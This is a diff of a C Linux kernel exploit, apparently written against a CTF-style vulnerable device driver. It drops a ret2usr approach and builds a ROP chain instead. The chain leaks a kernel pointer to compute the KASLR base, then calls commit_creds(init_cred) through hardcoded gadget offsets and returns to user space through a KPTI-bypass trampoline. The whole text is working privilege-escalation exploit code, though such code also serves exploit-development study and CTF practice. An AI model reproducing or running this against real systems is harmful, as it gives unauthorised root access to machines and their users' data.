@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <stdint.h>
 #ifndef HEXDUMP_COLS
 #define HEXDUMP_COLS 16
 #endif
@@ -14,9 +15,6 @@
             exit(EXIT_FAILURE); \
         }                       \
     }
-
-#define init_cred 0xffffffff824505e0 
-#define commit_creds  0xffffffff8108cd90
 
 void hexdump(void *mem, unsigned int len)
 {
@@ -83,25 +81,10 @@ static void save_state() {
         : "memory");
 }
 
-static void restore_state() {
-    asm("swapgs\n"
-        "movq %0, 0x20(%%rsp)\n"
-        "movq %1, 0x18(%%rsp)\n"
-        "movq %2, 0x10(%%rsp)\n"
-        "movq %3, 0x08(%%rsp)\n"
-        "movq %4, 0x00(%%rsp)\n"
-        "iretq\n"
-        :
-        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
-          "r"(win));
-}
-
-static void lpe() {
-    /* ??? */
-	void (*cc)(char*) = (void*)(commit_creds);
-	cc(init_cred);
-	restore_state();
-}
+#define init_cred 0xffffffff824505e0 - 0xffffffff81000000
+#define commit_creds  0xffffffff8108cd90 - 0xffffffff81000000
+#define pop_rdi_ret 0xffffffff811719c0 - 0xffffffff81000000
+#define bypass_kpti 0xffffffff81c00e06 - 0xffffffff81000000
 
 int main() {
     int fd;
@@ -113,9 +96,26 @@ int main() {
     is_error(fd == -1, "open() failed");
 
     read(fd, buf, 0x500);
-	*(unsigned long*)(buf + 0x400) = lpe;
-	write(fd, buf, 0x500);
 
+	//ROP chain
+	uint64_t* rop = (uint64_t*)(buf + 0x400);
+	uint64_t kernel_text = rop[0];
+	uint64_t kernel_base = kernel_text - (uint64_t)0x1f0c10;
+	printf("[-] kernel base: %p\n", kernel_base);
+
+	rop[0] = pop_rdi_ret + kernel_base;
+	rop[1] = init_cred + kernel_base;
+	rop[2] = commit_creds + kernel_base;
+	rop[3] = bypass_kpti + kernel_base;
+	rop[4] = 0;
+	rop[5] = 0;
+	rop[6] = win;
+	rop[7] = user_cs;
+	rop[8] = user_rflags;
+	rop[9] = user_rsp;
+	rop[10] = user_ss;
+
+	write(fd, buf, 0x500);
 
     return 0;
 }
